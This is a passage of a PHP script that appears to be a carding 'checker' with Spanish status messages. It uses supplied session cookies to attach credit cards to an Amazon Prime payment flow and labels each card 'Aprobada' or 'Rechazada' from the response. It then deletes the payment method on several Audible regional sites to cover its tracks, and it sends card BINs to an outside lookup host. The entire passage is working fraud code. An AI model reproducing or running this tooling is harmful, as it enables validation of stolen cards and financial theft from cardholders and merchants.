///////////////////////////////////////////////////////////////////////////////////////

$walletid2 = obtenercadena($resultado, 'hidden\" name=\"ppw-widgetState\" value=\"','\"');

///////////////////////////////////////////////////////////////////////////////////////

$ch = curl_init();
curl_setopt_array($ch, [
CURLOPT_URL            => "https://www.$cookieUS1/payments-portal/data/widgets2/v1/customer/".$idCliente."/continueWidget",
CURLOPT_RETURNTRANSFER => true,
CURLOPT_SSL_VERIFYPEER => false,
CURLOPT_FOLLOWLOCATION => true,
CURLOPT_COOKIE         => $cookie2,
CURLOPT_ENCODING       => "gzip",
CURLOPT_POSTFIELDS     => "ppw-jsEnabled=true&ppw-widgetState=".$walletid2."&ppw-widgetEvent=SavePaymentPreferenceEvent",
CURLOPT_HTTPHEADER     => array(
"Host: www.$cookieUS1",
$headers[] = "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS ".rand(10,99)."_1_2 like Mac OS X) AppleWebKit/".rand(100,999).".1.15 (KHTML, like Gecko) Version/17.1.2 Mobile/15E".rand(100,999)." Safari/".rand(100,999).".1",
"content-type: application/x-www-form-urlencoded",
),
]);
$resultado = curl_exec($ch);
curl_close($ch);

///////////////////////////////////////////////////////////////////////////////////////

$walletid = obtenercadena($resultado, 'preferencePaymentMethodIds":"[\"','\"');

///////////////////////////////////////////////////////////////////////////////////////
 
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.'.$cookieUS1.'/hp/wlp/pipeline/actions?redirectURL=L2dwL3ByaW1l&paymentsPortalPreferenceType=PRIME&paymentsPortalExternalReferenceID=prime&wlpLocation=prime_confirm&locationID=prime_confirm&primeCampaignId=SlashPrime&paymentMethodId='.$walletid.'&actionPageDefinitionId=WLPAction_AcceptOffer_HardVet&cancelRedirectURL=Lw&paymentMethodIdList='.$walletid.'&location=prime_confirm&session-id='.$sesionds.'');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie2);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie2);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
$headers = array();
$headers[] = 'Host: www.'.$cookieUS1.'';
$headers[] = 'Cookie: '.$cookie2.'';
$headers[] = 'Upgrade-Insecure-Requests: 1';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$Fin = curl_exec($ch);
curl_close($ch);

///////////////////////////////////////////////////////////////////////////////////////

$tokens = array(
"audible.de",
"audible.it",
"audible.es",
"audible.co.uk",
"audible.com.au",
"audible.ca",
"audible.com",
"audible.co.jp",
"audible.fr"
);

///////////////////////////////////////////////////////////////////////////////////////

for ($i = 0; $i < count($tokens); $i++) {
$host1111 = $tokens[$i];

$ultimaPosicionPunto = strrpos($host1111, '.');

if ($ultimaPosicionPunto !== false) { 

$despuesUltimoPunto = substr($host1111, $ultimaPosicionPunto + 1);

if ($despuesUltimoPunto === 'com') { 

$despuesUltimoPunto = 'US'; 

} 
} else {}

///////////////////////////////////////////////////////////////////////////////////////

$cookie2 = convertirCookie($cookieprim, strtoupper($despuesUltimoPunto));

///////////////////////////////////////////////////////////////////////////////////////

$ch = curl_init();
curl_setopt_array($ch, [
CURLOPT_URL            => 'https://www.'.$host1111.'/account/payments?ref=',
CURLOPT_RETURNTRANSFER => true,
CURLOPT_SSL_VERIFYPEER => false,
CURLOPT_FOLLOWLOCATION => true,
CURLOPT_COOKIE         => $cookie2,
CURLOPT_ENCODING       => "gzip",
CURLOPT_POSTFIELDS     => "",
CURLOPT_HTTPHEADER     => array(
'Host: www.'.$host1111.'',
'sec-ch-ua: "Not/A)Brand";v="99", "Brave";v="115", "Chromium";v="115"',
'sec-ch-ua-mobile: ?0',
'sec-ch-ua-platform: "Windows"',
'Upgrade-Insecure-Requests: 1',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
'Sec-GPC: 1',
'Accept-Language: pt-BR,pt;q=0.9',
),
]);
$r = curl_exec($ch);
curl_close($ch);

///////////////////////////////////////////////////////////////////////////////////////

$csrf   = obtenercadena($r, 'data-csrf-token="', '"');
if(stripos($csrf, '///')){
$c = obtenercadena($r, 'data-payment-id="', 'payment-type');
$csrf = obtenercadena($c, 'data-csrf-token="', '"');
}
$direccion = obtenercadena($r, 'data-billing-address-id="', '"');
$cookie2 = convertirCookie($cookieprim, strtoupper($despuesUltimoPunto));

///////////////////////////////////////////////////////////////////////////////////////

$ch = curl_init();
curl_setopt_array($ch, [
CURLOPT_URL => 'https://www.'.$host1111.'/unified-payment/deactivate-payment-instrument?requestUrl=https%3A%2F%2Fwww.'.$host1111.'%2Faccount%2Fpayments%3Fref%3D&relativeUrl=%2Faccount%2Fpayments&',
CURLOPT_RETURNTRANSFER => true,
CURLOPT_SSL_VERIFYPEER => false,
CURLOPT_FOLLOWLOCATION => true,
CURLOPT_COOKIE => $cookie2,
CURLOPT_ENCODING => "gzip",
CURLOPT_HEADER => true,
CURLOPT_POSTFIELDS => "isSubsConfMosaicMigrationEnabled=false&destinationUrl=%2Funified%2Fpayments%2Fmfa&transactionType=Recurring&unifiedPaymentWidgetView=true&paymentPreferenceName=Audible&clientId=audible&isAlcFlow=false&isConsentRequired=false&selectedMembershipBillingPaymentConfirmButton=adbl_accountdetails_mfa_required_credit_card_freetrial_error&selectedMembershipBillingPaymentDescriptionKey=adbl_order_redrive_membership_purchasehistory_mfa_verification&membershipBillingNoBillingDescriptionKey=adbl_order_redrive_membership_no_billing_desc_key&membershipBillingPaymentDescriptionKey=adbl_order_redrive_membership_billing_payments_list_desc_key&keepDialogOpenOnSuccess=false&isMfaCase=false&paymentsListChooseTextKey=adbl_accountdetails_select_default_payment_method&confirmSelectedPaymentDescriptionKey=&confirmButtonTextKey=adbl_paymentswidget_list_confirm_button&paymentsListDescriptionKey=adbl_accountdetails_manage_payment_methods_description&paymentsListTitleKey=adbl_accountdetails_manage_payment_methods&selectedPaymentDescriptionKey=&selectedPaymentTitleKey=adbl_paymentswidget_selected_payment_title&viewAddressDescriptionKey=&viewAddressTitleKey=adbl_paymentswidget_view_address_title&addAddressDescriptionKey=&addAddressTitleKey=adbl_paymentswidget_add_address_title&showEditTelephoneField=false&viewCardCvvField=false&editBankAccountDescriptionKey=&editBankAccountTitleKey=adbl_paymentswidget_edit_bank_account_title&addBankAccountDescriptionKey=&addBankAccountTitleKey=&editPaymentDescriptionKey=&editPaymentTitleKey=&addPaymentDescriptionKey=adbl_paymentswidget_add_payment_description&addPaymentTitleKey=adbl_paymentswidget_add_payment_title&editCardDescriptionKey=&editCardTitleKey=adbl_paymentswidget_edit_card_title&defaultPaymentMethodKey=adbl_accountdetails_default_payment_method&useAsDefaultCardKey=adbl_accountdetails_use_as_default_card&geoBlockAddressErrorKey=adbl_paymentswidget_payment_geoblocked_address&geoBlockErrorMessageKey=adbl_paymentswidget_geoblock_error_message&geoBlockErrorHeaderKey=adbl_paymentswidget_geoblock_error_header&addCardDescriptionKey=adbl_paymentswidget_add_card_description&addCardTitleKey=adbl_paymentswidget_add_card_title&ajaxEndpointPrefix=&geoBlockSupportedCountries=&enableGeoBlock=false&setDefaultOnSelect=true&makeDefaultCheckboxChecked=false&showDefaultCheckbox=false&autoSelectPayment=false&showConfirmButton=false&showAddButton=true&showDeleteButtons=true&showEditButtons=true&showClosePaymentsListButton=false&isDialog=false&isVerifyCvv=false&ref=a_accountPayments_c3_0_delete&paymentId=".$pago."&billingAddressId=".$direccion."&paymentType=CreditCard&tail=0433&accountHolderName=fsdsdgs%20sdffdssdff&isValid=true&isDefault=true&issuerName=MasterCard&displayIssuerName=MasterCard&bankName=&csrfToken=".urlencode($csrf)."&index=0&consentState=OptedIn",
CURLOPT_HTTPHEADER     => array(
'Host: www.'.$host1111.'',
'sec-ch-ua: "Not/A)Brand";v="99", "Brave";v="115", "Chromium";v="115"',
'Content-type: application/x-www-form-urlencoded',
'adpToken: ',
'X-Requested-With: XMLHttpRequest',
'sec-ch-ua-mobile: ?0',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
'sec-ch-ua-platform: "Windows"',
'Accept: */*',
'Sec-GPC: 1',
'Accept-Language: pt-BR,pt;q=0.9',
'Origin: https://www.'.$host1111.'',
'Referer: https://www.'.$host1111.'/account/payments?ref=',
),
]);
$r = curl_exec($ch);
curl_close($ch);

///////////////////////////////////////////////////////////////////////////////////////

if (strpos($r, '"statusStringKey":"adbl_paymentswidget_delete_payment_success"')) {
$msg     = '✅';
$err     = "Eliminado: $msg $err1";
break;
} else {
$msg = '❌';
$err     = "Eliminado: $msg $err1";
}
}

///////////////////////////////////////////////////////////////////////////////////////

if (strpos($r, '"statusStringKey":"adbl_paymentswidget_delete_payment_success"')) {
$msg     = '✅';
$err     = "Eliminado: $msg $err1";
} else {
$msg = '❌';
$err     = "Eliminado: $msg $err1";
}

///////////////////////////////////////////////////////////////////////////////////////

if (strpos($Fin, 'Lo lamentamos. No podemos completar tu registro en Prime en este momento. Si aún sigues interesado en unirte a Prime, puedes registrarte durante el proceso de finalización de la compra.')) {

$urlbin = 'https://chellyx.shop/dados/binsearch.php?bin='.$cc.'';
$infobin = file_get_contents($urlbin);

die('<span class="text-success">Aprobada</span> ➔ <span class="text-white">'.$lista.' '.$infobin.'</span> ➔ <span class="text-success"> Tarjeta vinculada con éxito. ('.$err.') </span> ➔ Tiempo de respuesta: (' . (time() - $tiempo) . 's) ➔ <span class="text-warning">@PladixOficial</span><br>');

}

if (strpos($Fin, 'We’re sorry. We’re unable to complete your Prime signup at this time. Please try again later.')) {

$urlbin = 'https://chellyx.shop/dados/binsearch.php?bin='.$cc.'';
$infobin = file_get_contents($urlbin);

die('<span class="text-success">Aprobada</span> ➔ <span class="text-white">'.$lista.' '.$infobin.'</span> ➔ <span class="text-success"> Tarjeta vinculada con éxito. ('.$err.') </span> ➔ Tiempo de respuesta: (' . (time() - $tiempo) . 's) ➔ <span class="text-warning">@PladixOficial</span><br>');

}

if (strpos($Fin, 'We’re sorry. We’re unable to complete your Prime signup at this time.')) {

$urlbin = 'https://chellyx.shop/dados/binsearch.php?bin='.$cc.'';
$infobin = file_get_contents($urlbin);

die('<span class="text-success">Aprobada</span> ➔ <span class="text-white">'.$lista.' '.$infobin.'</span> ➔ <span class="text-success"> Tarjeta vinculada con éxito. ('.$err.') </span> ➔ Tiempo de respuesta: (' . (time() - $tiempo) . 's) ➔ <span class="text-warning">@PladixOficial</span><br>');

}

elseif (strpos($Fin, 'Lo lamentamos. No podemos completar tu registro en Prime en este momento. Si aún sigues interesado en unirte a Prime, puedes registrarte durante el proceso de finalización de la compra.')) {

$urlbin = 'https://chellyx.shop/dados/binsearch.php?bin='.$cc.'';
$infobin = file_get_contents($urlbin);

die('<span class="text-success">Aprobada</span> ➔ <span class="text-white">'.$lista.' '.$infobin.'</span> ➔ <span class="text-success"> Tarjeta vinculada con éxito. ('.$err.') </span> ➔ Tiempo de respuesta: (' . (time() - $tiempo) . 's) ➔ <span class="text-warning">@PladixOficial</span><br>');

}elseif (strpos($Fin, 'InvalidInput')) {

$urlbin = 'https://chellyx.shop/dados/binsearch.php?bin='.$cc.'';
$infobin = file_get_contents($urlbin);

die('<span class="text-danger">Rechazada</span> ➔ <span class="text-white">'.$lista.' '.$infobin.'</span> ➔ <span class="text-danger"> Tarjeta inexistente. ('.$err.') </span> ➔ Tiempo de respuesta: (' . (time() - $tiempo) . 's) ➔ <span class="text-warning"></span><br>');

}elseif (strpos($Fin, 'HARDVET_VERIFICATION_FAILED')) {

$urlbin = 'https://chellyx.shop/dados/binsearch.php?bin='.$cc.'';
$infobin = file_get_contents($urlbin);

die('<span class="text-danger">Rechazada</span> ➔ <span class="text-white">'.$lista.' '.$infobin.'</span> ➔ <span class="text-danger"> Tarjeta inexistente. ('.$err.') </span> ➔ Tiempo de respuesta: (' . (time() - $tiempo) . 's) ➔ <span class="text-warning"></span><br>');

} else {

die('<span class="text-danger">Errores</span> ➔ <span class="text-white">'.$lista.'</span> ➔ <span class="text-danger"> Error interno - Amazon API </span> ➔ Tiempo de respuesta: (' . (time() - $tiempo) . 's) ➔ <span class="text-warning"></span><br>');

}

?>